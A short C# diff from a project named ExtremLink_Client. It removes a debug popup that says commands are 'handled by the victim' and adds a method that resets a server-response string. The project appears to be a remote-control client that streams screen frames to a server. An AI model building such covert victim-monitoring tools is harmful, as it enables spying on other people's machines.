@@ -246,7 +246,6 @@ namespace ExtremLink_Client.Classes
         {
             // Input: a string which represent a given frames command from the server.
             // Output: The function handles with the frames commands.
-            MessageBox.Show("Frames command message is now handled by the victim");
             switch (data)
             {
                 case "StartSendFrames":
@@ -312,9 +311,6 @@ namespace ExtremLink_Client.Classes
                     break;
             }
         }
-
-        
-        
         
         // Handle Sessions commands:
         private void HandleSessionsCommands(string message)
@@ -330,6 +326,14 @@ namespace ExtremLink_Client.Classes
 
         }
 
+
+        // Init server respond string
+        public void InitServerRespond()
+        {
+            // Input: Nothing.
+            // Output: The function initilaize the server respond string by inserting it empty string
+            this.serverRespond = "";
+        }
 
 
         // Sending frame functions:
